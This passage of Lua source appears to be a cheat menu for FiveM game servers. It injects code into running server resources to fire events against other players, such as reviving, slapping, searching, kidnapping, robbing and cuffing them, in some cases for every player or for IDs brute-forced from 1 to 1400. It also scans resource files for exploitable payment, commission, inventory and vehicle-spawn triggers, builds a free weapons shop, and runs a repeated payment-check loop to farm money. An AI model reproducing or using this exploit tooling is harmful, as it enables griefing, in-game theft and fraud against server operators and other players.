                local allPlayers = GetActivePlayers()
                for _, player in ipairs(allPlayers) do
                    local numId = GetPlayerServerId(player)
                    if numId and numId > 0 then
                        for _, triggerData in ipairs(foundTriggers.items) do
                            MachoInjectResource(triggerData.resource, 'TriggerServerEvent("hospital:server:RevivePlayer", ' .. numId .. ', false, true)')
                        end
                        MachoMenuNotification("Players", "Revived ID: " .. numId)
                    end
                end
                MachoMenuNotification("Players", "Revived all players")
            else
                local numId = tonumber(playerId)
                if numId then
                    for _, triggerData in ipairs(foundTriggers.items) do
                        MachoInjectResource(triggerData.resource, 'TriggerServerEvent("hospital:server:RevivePlayer", ' .. numId .. ', false, true)')
                    end
                    MachoMenuNotification("Players", "Revived ID: " .. numId)
                else
                    MachoMenuNotification("Error", "Invalid Player ID")
                end
            end
        else
            MachoMenuNotification("Error", "Enter a Player ID or -1 for all")
        end
    end)

    MachoMenuButton(PlayersSection, "Slap Player", function()
        local playerId = MachoMenuGetInputbox(playerIdInput)
        if playerId and playerId ~= "" then
            if playerId == "-1" then
                local allPlayers = GetActivePlayers()
                for _, player in ipairs(allPlayers) do
                    local numId = GetPlayerServerId(player)
                    if numId and numId > 0 then
                        -- Search for littlethings resource and verify it contains the slap event
                        local totalRes = GetNumResources()
                        local foundSlapResource = false
                        for i = 0, totalRes - 1 do
                            local resName = GetResourceByFindIndex(i)
                            if resName and GetResourceState(resName) == "started" then
                                local lowerName = string.lower(resName)
                                if string.find(lowerName, "littlethings") or string.find(lowerName, "slap") or string.find(lowerName, "admin") then
                                    -- Verify the resource contains the slap event by checking files
                                    local slapEventFound = false
                                    local checkFiles = {"client.lua", "server.lua", "shared.lua", "client/main.lua", "server/main.lua"}
                                    for _, fileName in ipairs(checkFiles) do
                                        local success, content = pcall(function()
                                            return LoadResourceFile(resName, fileName)
                                        end)
                                        if success and content and content ~= "" then
                                            local contentLower = string.lower(content)
                                            if string.find(contentLower, "slap:event") or string.find(contentLower, "slap_event") then
                                                slapEventFound = true
                                                break
                                            end
                                        end
                                    end
                                    if slapEventFound then
                                        MachoInjectResource(resName, 'TriggerEvent("Slap:Event", ' .. numId .. ')')
                                        foundSlapResource = true
                                        break
                                    end
                                end
                            end
                        end
                        if foundSlapResource then
                            MachoMenuNotification("Players", "Slapped Player ID: " .. numId)
                        else
                            MachoMenuNotification("Error", "Slap event not found in any resource")
                            return
                        end
                    end
                end
                if foundSlapResource then
                    MachoMenuNotification("Players", "Slapped all players")
                end
            else
                local numId = tonumber(playerId)
                if numId then
                    -- Search for littlethings resource and verify it contains the slap event
                    local totalRes = GetNumResources()
                    local foundSlapResource = false
                    for i = 0, totalRes - 1 do
                        local resName = GetResourceByFindIndex(i)
                        if resName and GetResourceState(resName) == "started" then
                            local lowerName = string.lower(resName)
                            if string.find(lowerName, "littlethings") or string.find(lowerName, "slap") or string.find(lowerName, "admin") then
                                -- Verify the resource contains the slap event by checking files
                                local slapEventFound = false
                                local checkFiles = {"client.lua", "server.lua", "shared.lua", "client/main.lua", "server/main.lua"}
                                for _, fileName in ipairs(checkFiles) do
                                    local success, content = pcall(function()
                                        return LoadResourceFile(resName, fileName)
                                    end)
                                    if success and content and content ~= "" then
                                        local contentLower = string.lower(content)
                                        if string.find(contentLower, "slap:event") or string.find(contentLower, "slap_event") then
                                            slapEventFound = true
                                            break
                                        end
                                    end
                                end
                                if slapEventFound then
                                    MachoInjectResource(resName, 'TriggerEvent("Slap:Event", ' .. numId .. ')')
                                    foundSlapResource = true
                                    break
                                end
                            end
                        end
                    end
                    if foundSlapResource then
                        MachoMenuNotification("Players", "Slapped Player ID: " .. numId)
                    else
                        MachoMenuNotification("Error", "Slap event not found in any resource")
                    end
                else
                    MachoMenuNotification("Error", "Invalid Player ID")
                end
            end
        else
            MachoMenuNotification("Error", "Enter a Player ID or -1 for all")
        end
    end)

    MachoMenuButton(PlayersSection, "Search Player", function()
        local playerId = MachoMenuGetInputbox(playerIdInput)
        if playerId and playerId ~= "" then
            if playerId == "-1" then
                local allPlayers = GetActivePlayers()
                for _, player in ipairs(allPlayers) do
                    local numId = GetPlayerServerId(player)
                    if numId and numId > 0 then
                        -- Search for police resource and verify it contains the search event
                        local totalRes = GetNumResources()
                        local foundSearchResource = false
                        for i = 0, totalRes - 1 do
                            local resName = GetResourceByFindIndex(i)
                            if resName and GetResourceState(resName) == "started" then
                                local lowerName = string.lower(resName)
                                if string.find(lowerName, "police") then
                                    -- Verify the resource contains the search event by checking files
                                    local searchEventFound = false
                                    local checkFiles = {"client.lua", "server.lua", "shared.lua", "client/main.lua", "server/main.lua"}
                                    for _, fileName in ipairs(checkFiles) do
                                        local success, content = pcall(function()
                                            return LoadResourceFile(resName, fileName)
                                        end)
                                        if success and content and content ~= "" then
                                            local contentLower = string.lower(content)
                                            if string.find(contentLower, "police:server:searchplayer") or string.find(contentLower, "searchplayer") then
                                                searchEventFound = true
                                                break
                                            end
                                        end
                                    end
                                    if searchEventFound then
                                        MachoInjectResource(resName, 'TriggerServerEvent("police:server:SearchPlayer", ' .. numId .. ')')
                                        foundSearchResource = true
                                        break
                                    end
                                end
                            end
                        end
                        if foundSearchResource then
                            MachoMenuNotification("Players", "Searched Player ID: " .. numId)
                        else
                            MachoMenuNotification("Error", "Search event not found in any police resource")
                            return
                        end
                    end
                end
                if foundSearchResource then
                    MachoMenuNotification("Players", "Searched all players")
                end
            else
                local numId = tonumber(playerId)
                if numId then
                    -- Search for police resource and verify it contains the search event
                    local totalRes = GetNumResources()
                    local foundSearchResource = false
                    for i = 0, totalRes - 1 do
                        local resName = GetResourceByFindIndex(i)
                        if resName and GetResourceState(resName) == "started" then
                            local lowerName = string.lower(resName)
                            if string.find(lowerName, "police") then
                                -- Verify the resource contains the search event by checking files
                                local searchEventFound = false
                                local checkFiles = {"client.lua", "server.lua", "shared.lua", "client/main.lua", "server/main.lua"}
                                for _, fileName in ipairs(checkFiles) do
                                    local success, content = pcall(function()
                                        return LoadResourceFile(resName, fileName)
                                    end)
                                    if success and content and content ~= "" then
                                        local contentLower = string.lower(content)
                                        if string.find(contentLower, "police:server:searchplayer") or string.find(contentLower, "searchplayer") then
                                            searchEventFound = true
                                            break
                                        end
                                    end
                                end
                                if searchEventFound then
                                    MachoInjectResource(resName, 'TriggerServerEvent("police:server:SearchPlayer", ' .. numId .. ')')
                                    foundSearchResource = true
                                    break
                                end
                            end
                        end
                    end
                    if foundSearchResource then
                        MachoMenuNotification("Players", "Searched Player ID: " .. numId)
                    else
                        MachoMenuNotification("Error", "Search event not found in any police resource")
                    end
                else
                    MachoMenuNotification("Error", "Invalid Player ID")
                end
            end
        else
            MachoMenuNotification("Error", "Enter a Player ID or -1 for all")
        end
    end)

    MachoMenuButton(PlayersSection, "Kidnap Player", function()
        local playerId = MachoMenuGetInputbox(playerIdInput)
        if playerId and playerId ~= "" then
            if playerId == "-1" then
                local allPlayers = GetActivePlayers()
                for _, player in ipairs(allPlayers) do
                    local numId = GetPlayerServerId(player)
                    if numId and numId > 0 then
                        -- Search for police resource and verify it contains the kidnap event
                        local totalRes = GetNumResources()
                        local foundKidnapResource = false
                        for i = 0, totalRes - 1 do
                            local resName = GetResourceByFindIndex(i)
                            if resName and GetResourceState(resName) == "started" then
                                local lowerName = string.lower(resName)
                                if string.find(lowerName, "police") then
                                    -- Verify the resource contains the kidnap event by checking files
                                    local kidnapEventFound = false
                                    local checkFiles = {"client.lua", "server.lua", "shared.lua", "client/main.lua", "server/main.lua"}
                                    for _, fileName in ipairs(checkFiles) do
                                        local success, content = pcall(function()
                                            return LoadResourceFile(resName, fileName)
                                        end)
                                        if success and content and content ~= "" then
                                            local contentLower = string.lower(content)
                                            if string.find(contentLower, "police:server:kidnapplayer") or string.find(contentLower, "kidnapplayer") then
                                                kidnapEventFound = true
                                                break
                                            end
                                        end
                                    end
                                    if kidnapEventFound then
                                        MachoInjectResource(resName, 'TriggerServerEvent("police:server:KidnapPlayer", ' .. numId .. ')')
                                        foundKidnapResource = true
                                        break
                                    end
                                end
                            end
                        end
                        if foundKidnapResource then
                            MachoMenuNotification("Players", "Kidnapped Player ID: " .. numId)
                        else
                            MachoMenuNotification("Error", "Kidnap event not found in any police resource")
                            return
                        end
                    end
                end
                if foundKidnapResource then
                    MachoMenuNotification("Players", "Kidnapped all players")
                end
            else
                local numId = tonumber(playerId)
                if numId then
                    -- Search for police resource and verify it contains the kidnap event
                    local totalRes = GetNumResources()
                    local foundKidnapResource = false
                    for i = 0, totalRes - 1 do
                        local resName = GetResourceByFindIndex(i)
                        if resName and GetResourceState(resName) == "started" then
                            local lowerName = string.lower(resName)
                            if string.find(lowerName, "police") then
                                -- Verify the resource contains the kidnap event by checking files
                                local kidnapEventFound = false
                                local checkFiles = {"client.lua", "server.lua", "shared.lua", "client/main.lua", "server/main.lua"}
                                for _, fileName in ipairs(checkFiles) do
                                    local success, content = pcall(function()
                                        return LoadResourceFile(resName, fileName)
                                    end)
                                    if success and content and content ~= "" then
                                        local contentLower = string.lower(content)
                                        if string.find(contentLower, "police:server:kidnapplayer") or string.find(contentLower, "kidnapplayer") then
                                            kidnapEventFound = true
                                            break
                                        end
                                    end
                                end
                                if kidnapEventFound then
                                    MachoInjectResource(resName, 'TriggerServerEvent("police:server:KidnapPlayer", ' .. numId .. ')')
                                    foundKidnapResource = true
                                    break
                                end
                            end
                        end
                    end
                    if foundKidnapResource then
                        MachoMenuNotification("Players", "Kidnapped Player ID: " .. numId)
                    else
                        MachoMenuNotification("Error", "Kidnap event not found in any police resource")
                    end
                else
                    MachoMenuNotification("Error", "Invalid Player ID")
                end
            end
        else
            MachoMenuNotification("Error", "Enter a Player ID or -1 for all")
        end
    end)

    MachoMenuButton(PlayersSection, "Rob Player", function()
        local playerId = MachoMenuGetInputbox(playerIdInput)
        if playerId and playerId ~= "" then
            if playerId == "-1" then
                local allPlayers = GetActivePlayers()
                for _, player in ipairs(allPlayers) do
                    local numId = GetPlayerServerId(player)
                    if numId and numId > 0 then
                        for _, triggerData in ipairs(foundTriggers.items) do
                            local advancedRobCode = string.format([[
                                local targetServerId = %d
                                local targetPlayer = GetPlayerFromServerId(targetServerId)
                                if targetPlayer ~= -1 then
                                    local targetPed = GetPlayerPed(targetPlayer)
                                    if targetPed ~= 0 and DoesEntityExist(targetPed) then
                                        local playerPed = PlayerPedId()
                                        TriggerServerEvent("police:server:RobPlayer", targetServerId)
                                    end
                                end
                            ]], numId)
                            MachoInjectResource(triggerData.resource, advancedRobCode)
                        end
                        MachoMenuNotification("Players", "Advanced Rob executed for ID: " .. numId)
                    end
                end
                MachoMenuNotification("Players", "Advanced Rob executed for all players")
            else
                local numId = tonumber(playerId)
                if numId then
                    for _, triggerData in ipairs(foundTriggers.items) do
                        local advancedRobCode = string.format([[
                            local targetServerId = %d
                            local targetPlayer = GetPlayerFromServerId(targetServerId)
                            if targetPlayer ~= -1 then
                                local targetPed = GetPlayerPed(targetPlayer)
                                if targetPed ~= 0 and DoesEntityExist(targetPed) then
                                    local playerPed = PlayerPedId()
                                    local originalCoords = GetEntityCoords(playerPed)
                                    local targetCoords = GetEntityCoords(targetPed)
                                    local teleportCoords = vector3(targetCoords.x, targetCoords.y, targetCoords.z - 1.0)
                                    TriggerServerEvent("police:server:RobPlayer", targetServerId)
                                end
                            end
                        ]], numId)
                        MachoInjectResource(triggerData.resource, advancedRobCode)
                    end
                    MachoMenuNotification("Players", "Advanced Rob executed for ID: " .. numId)
                else
                    MachoMenuNotification("Error", "Invalid Player ID")
                end
            end
        else
            MachoMenuNotification("Error", "Enter a Player ID or -1 for all")
        end
    end)

    MachoMenuButton(PlayersSection, "Cuff Player", function()
    local playerId = MachoMenuGetInputbox(playerIdInput)
    if playerId and playerId ~= "" then
        if playerId == "-1" then
            local players = GetActivePlayers()
            if #players > 0 then
                local cuffedCount = 0
                for _, player in ipairs(players) do
                    local serverId = GetPlayerServerId(player)
                    if serverId and serverId > 0 then
                        for _, triggerData in ipairs(foundTriggers.items) do
                            MachoInjectResource(triggerData.resource, 'TriggerServerEvent("police:server:CuffPlayer", ' .. serverId .. ', true)')
                        end
                        cuffedCount = cuffedCount + 1
                        Citizen.Wait(100)
                    end
                end
                if cuffedCount > 0 then
                    MachoMenuNotification("Players", "Cuffed " .. cuffedCount .. " players!")
                else
                    MachoMenuNotification("Error", "No valid players to cuff!")
                end
            else
                MachoMenuNotification("Error", "No active players found!")
            end
        elseif playerId == "0" then
            Citizen.CreateThread(function()
                local cuffedCount = 0
                for serverId = 1, 1400 do
                    if serverId > 0 then
                        for _, triggerData in ipairs(foundTriggers.items) do
                            MachoInjectResource(triggerData.resource, 'TriggerServerEvent("police:server:CuffPlayer", ' .. serverId .. ', true)')
                        end
                        cuffedCount = cuffedCount + 1
                        MachoMenuNotification("Players", "Tried Cuffing ID: " .. serverId)
                        Citizen.Wait(10) -- تأخير 10 مللي ثانية
                    end
                end
                if cuffedCount > 0 then
                    MachoMenuNotification("Players", "Tried cuffing " .. cuffedCount .. " IDs!")
                else
                    MachoMenuNotification("Error", "No valid IDs processed!")
                end
            end)
        else
            local serverId = tonumber(playerId)
            if serverId and serverId > 0 then
                for _, triggerData in ipairs(foundTriggers.items) do
                    MachoInjectResource(triggerData.resource, 'TriggerServerEvent("police:server:CuffPlayer", ' .. serverId .. ', true)')
                end
                MachoMenuNotification("Players", "Cuffed Player ID: " .. serverId)
            else
                MachoMenuNotification("Error", "Invalid Player ID")
            end
        end
    else
        MachoMenuNotification("Error", "Enter a Player ID or -1 for all")
    end
end)

    MachoMenuButton(PlayersSection, "Uncuff Player", function()
        local playerId = MachoMenuGetInputbox(playerIdInput)
        if playerId and playerId ~= "" then
            if playerId == "-1" then
                local allPlayers = GetActivePlayers()
                for _, player in ipairs(allPlayers) do
                    local numId = GetPlayerServerId(player)
                    if numId and numId > 0 then
                        for _, triggerData in ipairs(foundTriggers.items) do
                            MachoInjectResource(triggerData.resource, 'TriggerServerEvent("police:server:CuffPlayer", ' .. numId .. ', false)')
                        end
                        MachoMenuNotification("Players", "Uncuffed Player ID: " .. numId)
                    end
                end
                MachoMenuNotification("Players", "Uncuffed all players")
            else
                local numId = tonumber(playerId)
                if numId then
                    for _, triggerData in ipairs(foundTriggers.items) do
                        MachoInjectResource(triggerData.resource, 'TriggerServerEvent("police:server:CuffPlayer", ' .. numId .. ', false)')
                    end
                    MachoMenuNotification("Players", "Uncuffed Player ID: " .. numId)
                else
                    MachoMenuNotification("Error", "Invalid Player ID")
                end
            end
        else
            MachoMenuNotification("Error", "Enter a Player ID or -1 for all")
        end
    end)

end

-- Check for littlethings resource and execute trigger
local function checkAndExecuteLittlethings()
    local totalRes = GetNumResources()
    for i = 0, totalRes - 1 do
        local resName = GetResourceByFindIndex(i)
        if resName and GetResourceState(resName) == "started" then
            local lowerName = string.lower(resName)
            if string.find(lowerName, "littlethings") then
                MachoInjectResource(resName, 'TriggerServerEvent("QBCore:server:Paymentcheck")')
                table.insert(foundTriggers.payment, {
                    resource = resName,
                    trigger = "QBCore:server:Paymentcheck",
                    file = "littlethings",
                    state = "started"
                })
                MachoMenuNotification("Success", "Found littlethings resource, executing payment check")
                return true
            end
        end
    end
    return false
end

-- Comprehensive search
local function comprehensiveSearch()
    foundTriggers = {items = {}, money = {}, troll = {}, payment = {}, vehicle = {}}
    local foundCount = 0
    local expandedMappings = {
        ["qb-core"] = {
            {type = "vehicle", trigger = "QBCore:Command:SpawnVehicle"},
        },
        ["qb-inventory"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["qs-inventory"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["esx_inventoryhud"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["origen_inventory"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["core_inventory"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["hd-policejob"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["qb-policejob"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["esx-policejob"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["police"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["qb-shops"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["bridge"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["core-bridge"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["envi-bridge"] = {{type = "items", trigger = "inventory:server:OpenInventory"}}
    }

    -- Check mapped resources
    for resourceName, triggers in pairs(expandedMappings) do
        local state = GetResourceState(resourceName)
        if state == "started" then
            for _, triggerInfo in ipairs(triggers) do
                table.insert(foundTriggers[triggerInfo.type], {
                    resource = resourceName,
                    trigger = triggerInfo.trigger,
                    file = "database",
                    state = state
                })
                foundCount = foundCount + 1
            end
        end
    end

    -- Search for "littlethings" resource for payment trigger
    local totalRes = GetNumResources()
    for i = 0, totalRes - 1 do
        local resName = GetResourceByFindIndex(i)
        if resName and GetResourceState(resName) == "started" then
            local lowerName = string.lower(resName)
            if string.find(lowerName, "littlethings") then
                local isDuplicate = false
                for _, existing in ipairs(foundTriggers.payment) do
                    if existing.trigger == "QBCore:server:Paymentcheck" then
                        isDuplicate = true
                        break
                    end
                end
                if not isDuplicate then
                    table.insert(foundTriggers.payment, {
                        resource = resName,
                        trigger = "QBCore:server:Paymentcheck",
                        file = "littlethings",
                        state = "started"
                    })
                    foundCount = foundCount + 1
                end
            end
        end
    end

    -- Search for auction-related resources
    for i = 0, totalRes - 1 do
        local resName = GetResourceByFindIndex(i)
        if resName and GetResourceState(resName) == "started" then
            local lowerName = string.lower(resName)
            if string.find(lowerName, "carauction") or string.find(lowerName, "auction") then
                local dynamicTrigger = resName .. ":server:GiveComm"
                local isDuplicate = false
                for _, existing in ipairs(foundTriggers.money) do
                    if existing.trigger == dynamicTrigger then
                        isDuplicate = true
                        break
                    end
                end
                if not isDuplicate then
                    table.insert(foundTriggers.money, {
                        resource = resName,
                        trigger = dynamicTrigger,
                        file = "auction-pattern",
                        state = "started"
                    })
                    foundCount = foundCount + 1
                end
            end
        end
    end

    -- Advanced pattern search for additional triggers
    local advancedPatterns = {
        {patterns = {"inventory", "inv"}, triggers = {{type = "items", trigger = "inventory:server:OpenInventory"}}},
        {patterns = {"police", "cop", "sheriff", "leo"}, triggers = {{type = "items", trigger = "inventory:server:OpenInventory"}}},
        {patterns = {"job", "work", "employment"}, triggers = {{type = "items", trigger = "inventory:server:OpenInventory"}}},
        {patterns = {"shop", "store", "market"}, triggers = {{type = "items", trigger = "inventory:server:OpenInventory"}}},
        {patterns = {"core", "framework", "base"}, triggers = {{type = "vehicle", trigger = "QBCore:Command:SpawnVehicle"}}},
        {patterns = {"vehicle", "car", "garage"}, triggers = {{type = "vehicle", trigger = "QBCore:Command:SpawnVehicle"}}},
        {patterns = {"carauction", "auction"}, triggers = {{type = "money", trigger = "qb-carauction:server:GiveComm"}}}
    }
    local skipPatterns = {
        "mysql", "discord", "screenshot", "loading", "weather", "time",
        "map", "ui", "hud", "chat", "voice", "radio", "salt", "admin",
        "logging", "webpack", "yarn", "node", "lib", "util", "config",
        "monitor", "filesystem", "dependencies", "helper"
    }

    for i = 0, totalRes - 1 do
        local resName = GetResourceByFindIndex(i)
        if resName and GetResourceState(resName) == "started" then
            local lowerName = string.lower(resName)
            local shouldSkip = false
            for _, skipPattern in ipairs(skipPatterns) do
                if string.find(lowerName, skipPattern, 1, true) then
                    shouldSkip = true
                    break
                end
            end
            if expandedMappings[resName] or string.find(lowerName, "littlethings") then
                shouldSkip = true
            end
            if not shouldSkip then
                for _, patternGroup in ipairs(advancedPatterns) do
                    local matches = false
                    for _, pattern in ipairs(patternGroup.patterns) do
                        if string.find(lowerName, pattern, 1, true) then
                            matches = true
                            break
                        end
                    end
                    if matches then
                        for _, triggerInfo in ipairs(patternGroup.triggers) do
                            local isDuplicate = false
                            for _, existing in ipairs(foundTriggers[triggerInfo.type]) do
                                if existing.resource == resName and existing.trigger == triggerInfo.trigger then
                                    isDuplicate = true
                                    break
                                end
                            end
                            if not isDuplicate then
                                table.insert(foundTriggers[triggerInfo.type], {
                                    resource = resName,
                                    trigger = triggerInfo.trigger,
                                    file = "pattern",
                                    state = "started"
                                })
                                foundCount = foundCount + 1
                            end
                        end
                        break
                    end
                end
            end
            if foundCount >= 50 then
                break
            end
        end
    end

    -- If QBCore:server:Paymentcheck not found in littlethings, execute check
    if #foundTriggers.payment == 0 then
        checkAndExecuteLittlethings()
    end

    return foundCount > 0
end

-- Enhanced pattern search
local function enhancedPatternSearch()
    foundTriggers = {items = {}, money = {}, troll = {}, payment = {}, vehicle = {}}
    local foundCount = 0
    local totalResources = GetNumResources()
    local searchedResources = 0

    local function advancedSearchFile(resourceName, fileName, content)
        local found = false
        local contentLower = string.lower(content)
        local resourceState = GetResourceState(resourceName)
        local inventoryPatterns = {
            "inventory:server:openinventory",
            "inventory:server:open",
            "qb%-inventory:server:openinventory",
            "qs%-inventory:server:openinventory",
            "ox_inventory:openinventory",
            "esx_inventoryhud:server:openinventory"
        }
        for _, pattern in ipairs(inventoryPatterns) do
            if string.find(contentLower, pattern) then
                local exactTrigger = "inventory:server:OpenInventory"
                local exactMatch = content:match("'([^']*[Ii]nventory[^']*[Oo]pen[Ii]nventory[^']*)'") or
                                   content:match('"([^"]*[Ii]nventory[^"]*[Oo]pen[Ii]nventory[^"]*)"')
                if exactMatch then
                    exactTrigger = exactMatch
                end
                table.insert(foundTriggers.items, {
                    resource = resourceName,
                    trigger = exactTrigger,
                    file = fileName,
                    state = resourceState
                })
                foundCount = foundCount + 1
                found = true
                break
            end
        end
        if string.find(contentLower, ":server:givecomm") then
            local fullTrigger = "QBCore:server:GiveCommission"
            local exactMatch = content:match("'([^']*[Gg]ive[Cc]omm[^']*)'") or
                               content:match('"([^"]*[Gg]ive[Cc]omm[^"]*)"')
            if exactMatch then
                fullTrigger = exactMatch
            end
            table.insert(foundTriggers.money, {
                resource = resourceName,
                trigger = fullTrigger,
                file = fileName,
                state = resourceState
            })
            foundCount = foundCount + 1
            found = true
        end
        if string.find(contentLower, "server:paymentcheck") then
            local fullTrigger = "QBCore:server:Paymentcheck"
            table.insert(foundTriggers.payment, {
                resource = resourceName,
                trigger = fullTrigger,
                file = fileName,
                state = resourceState
            })
            foundCount = foundCount + 1
            found = true
        end
        if string.find(contentLower, "spawnvehicle") then
            local fullTrigger = "QBCore:Command:SpawnVehicle"
            local exactMatch = content:match("'([^']*[Ss]pawn[Vv]ehicle[^']*)'") or
                               content:match('"([^"]*[Ss]pawn[Vv]ehicle[^"]*)"')
            if exactMatch then
                fullTrigger = exactMatch
            end
            local isDuplicate = false
            for _, existing in ipairs(foundTriggers.vehicle) do
                if existing.resource == resourceName and existing.trigger == fullTrigger then
                    isDuplicate = true
                    break
                end
            end
            if not isDuplicate then
                table.insert(foundTriggers.vehicle, {
                    resource = resourceName,
                    trigger = fullTrigger,
                    file = fileName,
                    state = resourceState
                })
                foundCount = foundCount + 1
                found = true
            end
        end
        return found
    end

    for i = 0, totalResources - 1 do
        local resourceName = GetResourceByFindIndex(i)
        if resourceName then
            searchedResources = searchedResources + 1
            local skipPatterns = {
                "mysql", "oxmysql", "ghmattimysql", "webpack", "yarn", "node_modules",
                "discord", "screenshot", "loading", "spawn", "weather", "time",
                "map", "ui", "hud", "chat", "voice", "radio", "tokovoip", "salt",
                "filesystem", "monitor", "admin", "logging"
            }
            local shouldSkip = false
            local lowerName = string.lower(resourceName)
            for _, pattern in ipairs(skipPatterns) do
                if string.find(lowerName, pattern, 1, true) then
                    shouldSkip = true
                    break
                end
            end
            if not shouldSkip then
                local priorityFiles = {
                    "client.lua", "server.lua", "shared.lua",
                    "client/main.lua", "server/main.lua",
                    "client/interactions.lua"
                }
                for _, fileName in ipairs(priorityFiles) do
                    local success, content = pcall(function()
                        return LoadResourceFile(resourceName, fileName)
                    end)
                    if success and content and content ~= "" and string.len(content) < 500000 then
                        advancedSearchFile(resourceName, fileName, content)
                    end
                end
            end
            if searchedResources % 25 == 0 then
                MachoMenuNotification("Safe Search", "Progress: " .. math.floor((searchedResources/totalResources)*100) .. "% | Found: " .. foundCount)
                Citizen.Wait(25)
            end
            if foundCount >= 15 then
                break
            end
        end
    end
    return foundCount > 0
end

-- Original config generation
local function generateOriginalConfig()
    local configCode = [[
        local Config = {}
        Config.Products = {
            ["arcadebar"] = {
                [1] = { name = "faberge-egg", price = 0, amount = 100000000, info = {}, type = "item", slot = 1 },
                [2] = { name = "weapon_heavypistol", price = 0, amount = 100000000, info = {}, type = "item", slot = 2 },
                [3] = { name = "weapon_pistol_mk2", price = 0, amount = 100000000, info = {}, type = "item", slot = 3 },
                [4] = { name = "pistol_ammo", price = 0, amount = 100000000, info = {}, type = "item", slot = 4 },
                [5] = { name = "armor", price = 0, amount = 100000000, info = {}, type = "item", slot = 5 },
                [6] = { name = "ziptie", price = 0, amount = 100000000, info = {}, type = "item", slot = 6 },
                [7] = { name = "weapon_carbinerifle", price = 0, amount = 100000000, info = {}, type = "item", slot = 7 },
                [8] = { name = "bandage", price = 0, amount = 100000000, info = {}, type = "item", slot = 8 },
                [9] = { name = "lockpick", price = 0, amount = 100000000, info = {}, type = "item", slot = 9 },
                [10] = { name = "radio", price = 0, amount = 100000000, info = {}, type = "item", slot = 10 }
            }
        }
        Config.Locations = {
            ["arcadebar"] = {
                ["blip"] = "arcadebar_shop_blip",
                ["label"] = "arcadebar_shop",
                ["type"] = "arcadebar",
                ["coords"] = {[1] = vector3(339.17, -909.97, 29.25)},
                ["products"] = Config.Products["arcadebar"],
            },
        }
        local ShopItems = {}
        ShopItems.label = Config.Locations["arcadebar"]["label"]
        ShopItems.items = Config.Locations["arcadebar"]["products"]
        ShopItems.slots = 10
    ]]
    return configCode, 10
end

-- Player IDs functions
local function clearAllGamerTags()
    pcall(function()
        for pid, data in pairs(playerGamerTags) do
            if data and data.gamerTag and IsMpGamerTagActive(data.gamerTag) then
                RemoveMpGamerTag(data.gamerTag)
            end
        end
        playerGamerTags = {}
    end)
end

local function setGamerTagFivem(targetTag, pid)
    pcall(function()
        if targetTag and IsMpGamerTagActive(targetTag) then
            SetMpGamerTagVisibility(targetTag, 0, 1)
            SetMpGamerTagHealthBarColor(targetTag, 129)
            SetMpGamerTagAlpha(targetTag, 2, 255)
            SetMpGamerTagVisibility(targetTag, 2, 1)
            SetMpGamerTagAlpha(targetTag, 4, 0)
            SetMpGamerTagVisibility(targetTag, 4, 0)
            SetMpGamerTagColour(targetTag, 0, 0)
        end
    end)
end

local function clearGamerTagFivem(targetTag)
    pcall(function()
        if targetTag and IsMpGamerTagActive(targetTag) then
            SetMpGamerTagVisibility(targetTag, 0, 0)
            SetMpGamerTagVisibility(targetTag, 2, 0)
            SetMpGamerTagVisibility(targetTag, 4, 0)
        end
    end)
end

local function startPlayerIdThread()
    Citizen.CreateThread(function()
        local distanceToCheck = 150
        while isPlayerIdsEnabled do
            local success, err = pcall(function()
                local curCoords = GetEntityCoords(PlayerPedId())
                local allActivePlayers = GetActivePlayers()
                for _, pid in ipairs(allActivePlayers) do
                    if pid and pid ~= -1 then
                        local targetPed = GetPlayerPed(pid)
                        if targetPed and DoesEntityExist(targetPed) then
                            if not playerGamerTags[pid] or playerGamerTags[pid].ped ~= targetPed or not IsMpGamerTagActive(playerGamerTags[pid].gamerTag) then
                                local playerName = GetPlayerName(pid) or "unknown"
                                local serverId = GetPlayerServerId(pid) or 0
                                if playerName and serverId > 0 then
                                    playerName = string.sub(playerName, 1, 75)
                                    local playerStr = '[' .. serverId .. '] ' .. playerName
                                    playerGamerTags[pid] = {
                                        gamerTag = CreateFakeMpGamerTag(targetPed, playerStr, false, false, 0),
                                        ped = targetPed
                                    }
                                end
                            end
                            if playerGamerTags[pid] and playerGamerTags[pid].gamerTag then
                                local targetTag = playerGamerTags[pid].gamerTag
                                local targetPedCoords = GetEntityCoords(targetPed)
                                if targetPedCoords and curCoords then
                                    local distance = #(targetPedCoords - curCoords)
                                    if distance <= distanceToCheck then
                                        setGamerTagFivem(targetTag, pid)
                                    else
                                        clearGamerTagFivem(targetTag)
                                    end
                                end
                            end
                        end
                    end
                end
            end)
            if not success then
            end
            Citizen.Wait(250)
        end
        pcall(function()
            clearAllGamerTags()
        end)
    end)
end

-- Payment loop for QBCore:server:Paymentcheck
local function startPaymentLoop()
    isPaymentLoopRunning = true
    Citizen.CreateThread(function()
        while isPaymentLoopRunning do
            -- Check if we have payment triggers available
            if #foundTriggers.payment > 0 then
                for _, triggerData in ipairs(foundTriggers.payment) do
                    if triggerData.trigger == "QBCore:server:Paymentcheck" then
                        -- Execute the payment check directly without UI interference
                        Citizen.CreateThread(function()
                            MachoInjectResource(triggerData.resource, 'TriggerServerEvent("QBCore:server:Paymentcheck")')
                        end)
                    end
                end
                MachoMenuNotification("Money", "Payment check triggered")
            else
                -- Try to find littlethings resource again
                local totalRes = GetNumResources()
                local foundPaymentResource = false
                for i = 0, totalRes - 1 do
                    local resName = GetResourceByFindIndex(i)
                    if resName and GetResourceState(resName) == "started" then
                        local lowerName = string.lower(resName)
                        if string.find(lowerName, "littlethings") then
                            -- Verify the resource contains the payment check by checking files
                            local paymentEventFound = false
                            local checkFiles = {"client.lua", "server.lua", "shared.lua", "client/main.lua", "server/main.lua"}
                            for _, fileName in ipairs(checkFiles) do
                                local success, content = pcall(function()
                                    return LoadResourceFile(resName, fileName)
                                end)
                                if success and content and content ~= "" then
                                    local contentLower = string.lower(content)
                                    if string.find(contentLower, "paymentcheck") or string.find(contentLower, "payment.*check") then
                                        paymentEventFound = true
                                        break
                                    end
                                end
                            end
                            if paymentEventFound then
                                Citizen.CreateThread(function()
